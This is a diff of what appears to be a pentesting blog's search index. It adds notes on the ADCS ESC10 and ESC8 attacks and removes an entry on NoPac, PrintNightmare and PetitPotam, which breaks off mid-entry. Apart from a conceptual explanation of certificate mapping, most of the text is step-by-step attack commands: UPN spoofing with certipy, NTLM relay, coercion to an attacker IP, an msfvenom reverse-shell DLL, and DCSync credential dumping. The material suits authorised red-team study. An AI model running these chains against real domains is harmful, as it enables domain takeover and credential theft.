@@ -176,6 +176,266 @@
       </tags>
   </entry>
   <entry>
+    <title>ADCS : ESC10</title>
+    <url>/2026/06/04/ADCS-ESC10/</url>
+    <content><![CDATA[<h1 id="Certificate-authentication-mapping"><a href="#Certificate-authentication-mapping" class="headerlink" title="Certificate authentication mapping"></a>Certificate authentication mapping</h1><p>When we authenticate using the <code>Certificate Authentication</code> method the Domain Controller (KDC) must answer a critical question :</p>
+<blockquote>
+<p>➜ Which Active Directory account owns this certificate?</p>
+</blockquote>
+<p>The process of associating a certificate with an Active Directory account is called <code>Certificate Mapping</code>.</p>
+<p>Certificate mapping can occur in two different places:</p>
+<blockquote>
+<p>1- The KDC if we use kerberos PKINIT authentication</p>
+</blockquote>
+<p>   2- Schannel if we use TLS client certificate authentication</p>
+<h4 id="Case-1-Certificate-Kerberos"><a href="#Case-1-Certificate-Kerberos" class="headerlink" title="Case 1 : Certificate + Kerberos"></a>Case 1 : Certificate + Kerberos</h4><p>With this method, the certificate is used to request a Kerberos TGT through PKINIT.</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Certificate</span><br><span class="line">     ↓</span><br><span class="line">KDC asks: &quot;Who owns this certificate?&quot;</span><br><span class="line">     ↓</span><br><span class="line">Certificate Mapping</span><br><span class="line">     ↓</span><br><span class="line">TGT Issued</span><br></pre></td></tr></table></figure>
+
+<p>The important question becomes:</p>
+<blockquote>
+<p>How does the KDC answer this question : Who owns this certificate ?</p>
+</blockquote>
+<p>The answer is controlled by the <code>StrongCertificateBindingEnforcement</code> registry value:</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">reg query <span class="string">&quot;HKLM\SYSTEM\CurrentControlSet\Services\Kdc&quot;</span> /v StrongCertificateBindingEnforcement</span><br></pre></td></tr></table></figure>
+
+<p>This registry key defines how strictly the KDC maps certificates to Active Directory accounts.</p>
+<blockquote>
+<p>StrongCertificateBindingEnforcement &#x3D; 0</p>
+</blockquote>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">     Certificate</span><br><span class="line">          ↓</span><br><span class="line">KDC reads the UPN</span><br><span class="line">          ↓</span><br><span class="line">Finds the matching AD account</span><br><span class="line">          ↓</span><br><span class="line">      Issues a TGT</span><br></pre></td></tr></table></figure>
+
+<p>In this mode, the KDC relies on weak mapping methods such as the <code>UPN contained in the certificate</code> rather than enforcing <code>SID-based</code> validation.</p>
+<p>Example:</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Certificate UPN : administrator@mirage.htb</span><br><span class="line">Certificate SID : Attacker SID</span><br></pre></td></tr></table></figure>
+
+<p>The KDC searches Active Directory for :</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">administrator@mirage.htb</span><br></pre></td></tr></table></figure>
+
+<p>Then maps the certificate to the matching account and as a result a TGT is issued for the Administrator account even though the SID embedded in the certificate belongs to the attacker.</p>
+<blockquote>
+<p>StrongCertificateBindingEnforcement &#x3D; 1</p>
+</blockquote>
+<p>In Compatibility Mode, the KDC first attempts SID-based certificate mapping and falls back to weaker methods such as UPN mapping if SID validation cannot be performed.</p>
+<blockquote>
+<p>StrongCertificateBindingEnforcement &#x3D; 2</p>
+</blockquote>
+<p>In Full Enforcement Mode, the KDC only performs SID-based certificate mapping and ignores weaker identifiers such as UPN, SAN, or Subject fields.</p>
+<h4 id="Case-2-Certificate-Schannel-Secure-Channel"><a href="#Case-2-Certificate-Schannel-Secure-Channel" class="headerlink" title="Case 2 : Certificate + Schannel (Secure Channel)"></a>Case 2 : Certificate + Schannel (Secure Channel)</h4><p>With this method, the certificate is used directly against a TLS-enabled service such as <code>LDAPS</code>, <code>HTTPS</code>, or <code>WinRM over HTTPS</code>.</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Certificate</span><br><span class="line">     ↓</span><br><span class="line">LDAPS / IIS / WinRM HTTPS</span><br><span class="line">     ↓</span><br><span class="line">Schannel asks: &quot;Who owns this certificate?&quot;</span><br><span class="line">     ↓</span><br><span class="line">Certificate Mapping</span><br><span class="line">     ↓</span><br><span class="line">Authenticated Session</span><br></pre></td></tr></table></figure>
+
+<p>The important question becomes:</p>
+<blockquote>
+<p>How does Schannel answer this question: Who owns this certificate?</p>
+</blockquote>
+<p>The answer is controlled by the <code>CertificateMappingMethods</code> registry value:</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">reg query <span class="string">&quot;HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL&quot;</span> /v CertificateMappingMethods</span><br></pre></td></tr></table></figure>
+
+<p>This registry key defines how Schannel maps certificates to Active Directory accounts.</p>
+<p>Schannel (Secure Channel) is Microsoft’s SSL&#x2F;TLS implementation used by services such as HTTPS, LDAPS, and other TLS-based applications, unlike Kerberos PKINIT this authentication flow does not issue a TGT instead the user receives an authenticated session to the target service.</p>
+<blockquote>
+<p>CertificateMappingMethods &#x3D; 0x4</p>
+</blockquote>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">     Certificate</span><br><span class="line">          ↓</span><br><span class="line">Schannel reads Subject</span><br><span class="line">          ↓</span><br><span class="line">Finds the matching AD account</span><br><span class="line">          ↓</span><br><span class="line">Creates an authenticated session</span><br></pre></td></tr></table></figure>
+
+<p>In this mode, Schannel relies on weak mapping methods such as the certificate Subject rather than enforcing strong SID-based validation.</p>
+<p>Example:</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Certificate Subject : CN=Administrator</span><br><span class="line">Certificate SID     : Attacker SID</span><br></pre></td></tr></table></figure>
+
+<p>Schannel searches Active Directory for:</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">CN=Administrator</span><br></pre></td></tr></table></figure>
+
+<p>Then maps the certificate to the matching account. As a result, an authenticated session may be established as the Administrator account even though the certificate SID belongs to the attacker.</p>
+<h1 id="Esc10"><a href="#Esc10" class="headerlink" title="Esc10"></a>Esc10</h1><blockquote>
+<p>ESC10 is an AD CS misconfiguration that occurs when weak certificate mapping is used. Instead of mapping a certificate to an account using the <code>SID</code> stored in the <code>szOID_NTDS_CA_SECURITY_EXT</code> extension, the system relies on weaker identifiers such as the certificate’s <code>UPN</code> or <code>Subject</code> that are embedded in the certificate, this may allow an attacker to obtain a certificate that maps to another Active Directory account and authenticate as that user.</p>
+</blockquote>
+<h3 id="Case-1-Kerberos-PKINIT-mapping"><a href="#Case-1-Kerberos-PKINIT-mapping" class="headerlink" title="Case 1 : Kerberos &#x2F; PKINIT mapping"></a>Case 1 : Kerberos &#x2F; PKINIT mapping</h3><h5 id="Requirements"><a href="#Requirements" class="headerlink" title="Requirements"></a>Requirements</h5><blockquote>
+<ul>
+<li><p>Weak Kerberos mapping : <code>StrongCertificateBindingEnforcement = 0</code></p>
+</li>
+<li><p>Client authentication template : At least one enabled certificate template must allow client authentication, such as the built-in <code>User</code> template.</p>
+</li>
+<li><p>Write access over another account : We need at least <code>GenericWrite</code> permissions over another user account.</p>
+</li>
+</ul>
+</blockquote>
+<p>➜ After Microsoft’s 2023 certificate mapping hardening updates, ESC10 Case 1 became significantly harder to exploit, systems that enforce SID-based certificate mapping are generally not vulnerable, while unpatched systems or environments that still allow weak mapping may remain exploitable.</p>
+<h5 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h5><blockquote>
+<p>Find AD CS </p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜ netexec ldap dc-ip -u user -p <span class="built_in">pwd</span> -M adcs</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Check the Kerberos certificate mapping configuration (<code>StrongCertificateBindingEnforcement</code>)</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">reg query <span class="string">&quot;HKLM\SYSTEM\CurrentControlSet\Services\Kdc&quot;</span> /v StrongCertificateBindingEnforcement</span><br><span class="line"></span><br><span class="line">➜ The value should be <span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Enumerate Certificate Authorities and templates</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜ certipy find -u user -p <span class="built_in">pwd</span> -dc-ip ip -stdout</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Identify vulnerable certificate configurations</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜ certipy find -u user -p <span class="built_in">pwd</span> -dc-ip ip -vulnerable -stdout</span><br></pre></td></tr></table></figure>
+
+
+<h5 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h5><blockquote>
+<ul>
+<li><p>user-b has one of those permissions ( GenericAll &#x2F; GenericWrite &#x2F; WriteProperty &#x2F; WriteDACL &#x2F; Owner ) over user-a</p>
+</li>
+<li><p>user-a : is the account that will be used to request <code>Administrator Certificate</code></p>
+</li>
+</ul>
+</blockquote>
+<blockquote>
+<p>Change user-a’s UPN to the target identity</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜ certipy account update -u user-b -p pwd -target dc.lab.local -user user-a -upn administrator@lab.local</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Request a certificate using an authentication-enabled template</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜ certipy req -u &#x27;user-a@lab.local&#x27; -p pwd -target dc.lab.local -ca CA-Name -template User</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Restore user-a’s original UPN</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜ certipy account update -u user-b -p <span class="built_in">pwd</span> -target dc.lab.local -user user-a -upn user-a@lab.local</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Authenticate with the certificate</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜ certipy auth -pfx user-a.pfx -domain lab.local -dc-ip dc-ip</span><br></pre></td></tr></table></figure>
+
+
+
+
+<h3 id="Case-2-Schannel-Mapping"><a href="#Case-2-Schannel-Mapping" class="headerlink" title="Case 2 : Schannel Mapping"></a>Case 2 : Schannel Mapping</h3><h5 id="Requirements-1"><a href="#Requirements-1" class="headerlink" title="Requirements"></a>Requirements</h5><blockquote>
+<ul>
+<li>Weak Schannel mapping: <code>CertificateMappingMethods = 0x4</code></li>
+<li>Client authentication template: At least one enabled certificate template must allow client authentication.</li>
+<li>Write access over another account: We need at least <code>GenericWrite</code> permissions over another user account.</li>
+</ul>
+</blockquote>
+<h5 id="Enumeration-1"><a href="#Enumeration-1" class="headerlink" title="Enumeration"></a>Enumeration</h5><blockquote>
+<p>Find AD CS</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜ netexec ldap dc-ip -u user -p pwd -M adcs</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Check the Schannel certificate mapping configuration (<code>CertificateMappingMethods</code>)</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg query &quot;HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL&quot; /v CertificateMappingMethods</span><br><span class="line"></span><br><span class="line">➜ The value should be 0x4</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Enumerate Certificate Authorities and templates</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜ certipy find -u user -p pwd -dc-ip ip -stdout</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Identify vulnerable certificate configurations</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜ certipy find -u user -p pwd -dc-ip ip -vulnerable -stdout</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>➜ Certipy does not directly detect ESC10 by querying the Schannel <code>CertificateMappingMethods</code> registry key on Domain Controllers or other target servers, as this typically requires privileged access (like local administrator rights) to those servers’ registries.</p>
+</blockquote>
+<h5 id="Exploitation-1"><a href="#Exploitation-1" class="headerlink" title="Exploitation"></a>Exploitation</h5><blockquote>
+<ul>
+<li>user-b has one of those permissions (<code>GenericAll</code> &#x2F; <code>GenericWrite</code> &#x2F; <code>WriteProperty</code> &#x2F; <code>WriteDACL</code> &#x2F; <code>Owner</code>) over user-a</li>
+<li>user-a is the account that will be used to request the target certificate</li>
+</ul>
+</blockquote>
+<blockquote>
+<p>Change user-a’s UPN to the target identity</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜ certipy account update -u user-b -p pwd -target dc.lab.local -user user-a -upn DC-Name$</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Request a certificate using an authentication-enabled template</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜ certipy req -u &#x27;user-a@lab.local&#x27; -p pwd -target dc.lab.local -ca CA-Name -template User</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Restore user-a’s original UPN</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜ certipy account update -u user-b -p pwd -target dc.lab.local -user user-a -upn user-a@lab.local</span><br></pre></td></tr></table></figure>
+
+
+<blockquote>
+<p>Finally, because this misconfiguration affects Schannel certificate mapping rather than Kerberos PKINIT mapping, the certificate cannot be used to obtain a Kerberos TGT as in ESC10 Case 1 instead authentication must be performed through a Schannel-enabled service such as LDAPS, for this purpose Certipy provides the <code>-ldap-shell</code> option which authenticates using the certificate via Schannel and opens an authenticated LDAP session. Although this session does not provide code execution, it allows us to modify Active Directory objects and perform attacks such as configuring  (RBCD).</p>
+</blockquote>
+<blockquote>
+<p>Creating a new computer account</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜ certipy auth -pfx DC-Name.pfx -domain lab.local -dc-ip ip -ldap-shell</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># add_computer &lt;machine-name&gt; &lt;password&gt;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Configure Rbcd </p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜ certipy auth -pfx DC-Name.pfx -domain lab.local -dc-ip 10.129.205.199 -ldap-shell</span><br><span class="line"></span><br><span class="line"><span class="comment"># set_rbcd &lt;TARGET_MACHINE&gt; &lt;CONTROLLED_MACHINE&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Abusing RBCD to Impersonate the Administrator</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">getST.py -spn cifs/DC.LAB.LOCAL -impersonate Administrator -dc-ip ip lab.local/<span class="string">&#x27;machine-name$&#x27;</span>:password</span><br><span class="line"></span><br><span class="line">[*] Saving ticket <span class="keyword">in</span> Administrator.ccache</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Windows</category>
+        <category>Exploitation</category>
+        <category>ADCS</category>
+      </categories>
+      <tags>
+        <tag>Certipy</tag>
+        <tag>ESC10</tag>
+        <tag>Netexec</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ADCS : ESC8</title>
+    <url>/2025/11/30/ADCS-ESC8/</url>
+    <content><![CDATA[<h3 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h3><p>Search for vulnerable certificate templates</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">certipy find -u username -p password -dc-ip &lt;DC-IP&gt; -target &lt;DC-Name&gt; -enabled -vulnerable -stdout</span><br></pre></td></tr></table></figure>
+
+<p>Identify ADCS Enrollment Services and Certificate Template Names</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc ldap target -u username -p password -M adcs</span><br></pre></td></tr></table></figure>
+
+<p>Enumerate ADCS over SMB</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb target -M enum_ca</span><br></pre></td></tr></table></figure>
+
+<h3 id="Start-NTLM-Relay-to-ADCS-Web-Enrollment"><a href="#Start-NTLM-Relay-to-ADCS-Web-Enrollment" class="headerlink" title="Start NTLM Relay to ADCS Web Enrollment"></a>Start NTLM Relay to ADCS Web Enrollment</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-ntlmrelayx -t http://domain/certsrv/certfnsh.asp -smb2support --adcs --template &lt;CERT-TEMPLATE&gt; --no-http-server --no-wcf-server --no-raw-server</span><br></pre></td></tr></table></figure>
+
+<p>Or</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">certipy relay -target <span class="string">&#x27;http://&lt;DC-Name.domain&gt;/&#x27;</span> -template &lt;CERT-TEMPLATE&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>➜ After running the coerce tool, these commands will generate a .pfx certificate file for the DC machine.</code></p>
+<h3 id="Force-Machine-Authentication"><a href="#Force-Machine-Authentication" class="headerlink" title="Force Machine Authentication"></a>Force Machine Authentication</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 printerbug.py &lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD&gt;@&lt;DC-IP&gt; &lt;ATTACKER-IP&gt;</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="Request-TGT"><a href="#Request-TGT" class="headerlink" title="Request TGT"></a>Request TGT</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 gettgtpkinit.py -cert-pfx &lt;PATH-TO-PFX&gt; -dc-ip &lt;DC-IP&gt; <span class="string">&#x27;&lt;DOMAIN&gt;/&lt;MACHINE-ACCOUNT&gt;$&#x27;</span> &lt;OUTPUT-CCACHE&gt;</span><br></pre></td></tr></table></figure>
+
+<p>Or </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">certipy auth -pfx &lt;OUTPUT-CCACHE&gt; -dc-ip &lt;DC-IP&gt; </span><br></pre></td></tr></table></figure>
+
+
+<h3 id="Set-Kerberos-Cache-to-Use-the-TGT"><a href="#Set-Kerberos-Cache-to-Use-the-TGT" class="headerlink" title="Set Kerberos Cache to Use the TGT"></a>Set Kerberos Cache to Use the TGT</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> KRB5CCNAME=&lt;OUTPUT-CCACHE&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Perform-DCSync"><a href="#Perform-DCSync" class="headerlink" title="Perform DCSync"></a>Perform DCSync</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-secretsdump -k -no-pass -dc-ip &lt;DC-IP&gt; -just-dc-user &lt;TARGET-USER&gt; <span class="string">&#x27;&lt;DOMAIN&gt;/&lt;MACHINE-ACCOUNT&gt;$&#x27;</span>@&lt;DC-HOSTNAME&gt;</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Windows</category>
+        <category>Exploitation</category>
+        <category>ADCS</category>
+      </categories>
+      <tags>
+        <tag>Certipy</tag>
+        <tag>ESC8</tag>
+        <tag>impacket-ntlmrelayx</tag>
+        <tag>printerbug</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>AlwaysInstallElevated</title>
     <url>/2026/06/26/AlwaysInstallElevated/</url>
     <content><![CDATA[<blockquote>
@@ -443,460 +703,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Bleeding-Edge &amp; Coercion</title>
-    <url>/2026/06/30/Bleeding-Edge-Coercion/</url>
-    <content><![CDATA[<blockquote>
-<p>➜ Everything here needs only a valid domain account yet can jump straight to Domain Admin. </p>
-</blockquote>
-<h2 id="NoPac-CVE-2021-42278-42287"><a href="#NoPac-CVE-2021-42278-42287" class="headerlink" title="NoPac (CVE-2021-42278 &#x2F; 42287)"></a>NoPac (CVE-2021-42278 &#x2F; 42287)</h2><blockquote>
-<p>➜ NoPac chains two bugs: we rename a machine account we create to match the DC’s name (42278), then request a service ticket after the DC object is restored, so the KDC issues us a ticket as the DC (42287). The result is a SYSTEM shell or a DCSync.</p>
-</blockquote>
-<h4 id="Setup"><a href="#Setup" class="headerlink" title="Setup"></a>Setup</h4><h5 id="Clone-NoPac"><a href="#Clone-NoPac" class="headerlink" title="Clone NoPac"></a>Clone NoPac</h5><blockquote>
-<p>➜ Clone the exploit repo :</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/Ridter/noPac.git</span><br></pre></td></tr></table></figure>
-
-<h4 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h4><h5 id="Scan-Whether-the-Domain-Is-Vulnerable"><a href="#Scan-Whether-the-Domain-Is-Vulnerable" class="headerlink" title="Scan Whether the Domain Is Vulnerable"></a>Scan Whether the Domain Is Vulnerable</h5><blockquote>
-<p>➜ Run the bundled scanner to confirm the DC is exploitable before firing.</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> python3 scanner.py &lt;DOMAIN&gt;/&lt;user&gt;:&lt;pass&gt; -dc-ip &lt;DC_IP&gt; -use-ldap</span><br></pre></td></tr></table></figure>
-
-<h5 id="Pop-a-SYSTEM-Shell-on-the-DC"><a href="#Pop-a-SYSTEM-Shell-on-the-DC" class="headerlink" title="Pop a SYSTEM Shell on the DC"></a>Pop a SYSTEM Shell on the DC</h5><blockquote>
-<p>➜ Impersonate the administrator and drop into a semi-interactive SYSTEM shell.</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> python3 noPac.py &lt;DOMAIN&gt;/&lt;user&gt;:&lt;pass&gt; -dc-ip &lt;DC_IP&gt; -dc-host &lt;DC_HOST&gt; --impersonate administrator -use-ldap -shell</span><br></pre></td></tr></table></figure>
-
-<h5 id="DCSync-Straight-to-a-Dump"><a href="#DCSync-Straight-to-a-Dump" class="headerlink" title="DCSync Straight to a Dump"></a>DCSync Straight to a Dump</h5><blockquote>
-<p>➜ Skip the shell and dump the administrator’s hash directly via DCSync.</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> python3 noPac.py &lt;DOMAIN&gt;/&lt;user&gt;:&lt;pass&gt; -dc-ip &lt;DC_IP&gt; -dc-host &lt;DC_HOST&gt; --impersonate administrator -use-ldap -dump -just-dc-user &lt;DOMAIN&gt;/administrator</span><br></pre></td></tr></table></figure>
-
-<h2 id="PrintNightmare-CVE-2021-1675-34527"><a href="#PrintNightmare-CVE-2021-1675-34527" class="headerlink" title="PrintNightmare (CVE-2021-1675 &#x2F; 34527)"></a>PrintNightmare (CVE-2021-1675 &#x2F; 34527)</h2><blockquote>
-<p>➜ PrintNightmare abuses the Print Spooler service: a low-priv user makes the spooler load a malicious driver DLL, which runs as SYSTEM on the target.</p>
-</blockquote>
-<h4 id="Setup-1"><a href="#Setup-1" class="headerlink" title="Setup"></a>Setup</h4><h5 id="Clone-the-Exploit"><a href="#Clone-the-Exploit" class="headerlink" title="Clone the Exploit"></a>Clone the Exploit</h5><blockquote>
-<p>➜ Clone the exploit repo :</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/cube0x0/CVE-2021-1675.git</span><br></pre></td></tr></table></figure>
-
-<h5 id="Remove-the-Default-Impacket"><a href="#Remove-the-Default-Impacket" class="headerlink" title="Remove the Default Impacket"></a>Remove the Default Impacket</h5><blockquote>
-<p>➜ This exploit requires cube0x0’s Impacket fork, so uninstall the current one first.</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip3 uninstall impacket</span><br></pre></td></tr></table></figure>
-
-<h5 id="Clone-cube0x0’s-Impacket"><a href="#Clone-cube0x0’s-Impacket" class="headerlink" title="Clone cube0x0’s Impacket"></a>Clone cube0x0’s Impacket</h5><blockquote>
-<p>➜ Clone the required fork.</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/cube0x0/impacket</span><br></pre></td></tr></table></figure>
-
-<h5 id="Install-cube0x0’s-Impacket"><a href="#Install-cube0x0’s-Impacket" class="headerlink" title="Install cube0x0’s Impacket"></a>Install cube0x0’s Impacket</h5><blockquote>
-<p>➜ Install the fork so the exploit’s RPC calls work.</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> impacket &amp;&amp; <span class="built_in">sudo</span> python3 ./setup.py install</span><br></pre></td></tr></table></figure>
-
-<h4 id="Exploitation-1"><a href="#Exploitation-1" class="headerlink" title="Exploitation"></a>Exploitation</h4><h5 id="Confirm-the-Spooler-RPC-Interface-Is-Reachable"><a href="#Confirm-the-Spooler-RPC-Interface-Is-Reachable" class="headerlink" title="Confirm the Spooler RPC Interface Is Reachable"></a>Confirm the Spooler RPC Interface Is Reachable</h5><blockquote>
-<p>➜ Check the target exposes MS-RPRN &#x2F; MS-PAR.</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rpcdump.py @&lt;DC_IP&gt; | egrep <span class="string">&#x27;MS-RPRN|MS-PAR&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<h5 id="Generate-the-Payload-DLL"><a href="#Generate-the-Payload-DLL" class="headerlink" title="Generate the Payload DLL"></a>Generate the Payload DLL</h5><blockquote>
-<p>➜ Build a reverse-shell driver DLL.</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;attacker&gt; LPORT=8080 -f dll -o backupscript.dll</span><br></pre></td></tr></table></figure>
-
-<h5 id="Host-the-DLL-on-an-SMB-Share"><a href="#Host-the-DLL-on-an-SMB-Share" class="headerlink" title="Host the DLL on an SMB Share"></a>Host the DLL on an SMB Share</h5><blockquote>
-<p>➜ Serve the DLL so the spooler can fetch it.</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> smbserver.py -smb2support CompData /path/to/dll/</span><br></pre></td></tr></table></figure>
-
-<h5 id="Fire-the-Exploit"><a href="#Fire-the-Exploit" class="headerlink" title="Fire the Exploit"></a>Fire the Exploit</h5><blockquote>
-<p>➜ Force the spooler to load the DLL from our share, executing it as SYSTEM.</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> python3 CVE-2021-1675.py &lt;DOMAIN&gt;/&lt;user&gt;:&lt;pass&gt;@&lt;DC_IP&gt; <span class="string">&#x27;\\&lt;attacker&gt;\CompData\backupscript.dll&#x27;</span></span><br></pre></td></tr></table></figure>
-
-
-<h2 id="PetitPotam-→-ADCS-Relay-CVE-2021-36942"><a href="#PetitPotam-→-ADCS-Relay-CVE-2021-36942" class="headerlink" title="PetitPotam → ADCS Relay (CVE-2021-36942)"></a>PetitPotam → ADCS Relay (CVE-2021-36942)</h2><blockquote>
-<p>➜ Coercion means forcing a machine to authenticate to us, PetitPotam coerces the DC to authenticate and we relay that authentication to the AD CS web-enrollment endpoint to request a certificate as the DC which we then use to DCSync.</p>
-</blockquote>
-<h4 id="Linux-Path"><a href="#Linux-Path" class="headerlink" title="Linux Path"></a>Linux Path</h4><h5 id="Relay-the-DC-Auth-to-the-CA"><a href="#Relay-the-DC-Auth-to-the-CA" class="headerlink" title="Relay the DC Auth to the CA"></a>Relay the DC Auth to the CA</h5><blockquote>
-<p>➜ Stand up the relay against the CA’s web-enrollment endpoint and request a DomainController certificate.</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ntlmrelayx.py -debug -smb2support --target http://&lt;CA_HOST&gt;/certsrv/certfnsh.asp --adcs --template DomainController</span><br></pre></td></tr></table></figure>
-
-<h5 id="Coerce-the-DC-to-Authenticate"><a href="#Coerce-the-DC-to-Authenticate" class="headerlink" title="Coerce the DC to Authenticate"></a>Coerce the DC to Authenticate</h5><blockquote>
-<p>➜ Force the DC to authenticate to our relay.</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 PetitPotam.py &lt;attacker_IP&gt; &lt;DC_IP&gt;</span><br></pre></td></tr></table></figure>
-
-<h5 id="Request-a-TGT-via-PKINIT"><a href="#Request-a-TGT-via-PKINIT" class="headerlink" title="Request a TGT via PKINIT"></a>Request a TGT via PKINIT</h5><blockquote>
-<p>➜ Use the captured base64 certificate to request a TGT for the DC account.</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 /opt/PKINITtools/gettgtpkinit.py &lt;DOMAIN&gt;/&lt;DC_NAME&gt;\$ -pfx-base64 &lt;BASE64_CERT&gt; dc01.ccache</span><br></pre></td></tr></table></figure>
-
-<h5 id="Export-the-Ticket"><a href="#Export-the-Ticket" class="headerlink" title="Export the Ticket"></a>Export the Ticket</h5><blockquote>
-<p>➜ Point Kerberos at the new ticket cache.</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> KRB5CCNAME=dc01.ccache</span><br></pre></td></tr></table></figure>
-
-<h5 id="DCSync-the-Domain"><a href="#DCSync-the-Domain" class="headerlink" title="DCSync the Domain"></a>DCSync the Domain</h5><blockquote>
-<p>➜ DCSync the administrator using the DC’s ticket.</p>
-</blockquote>
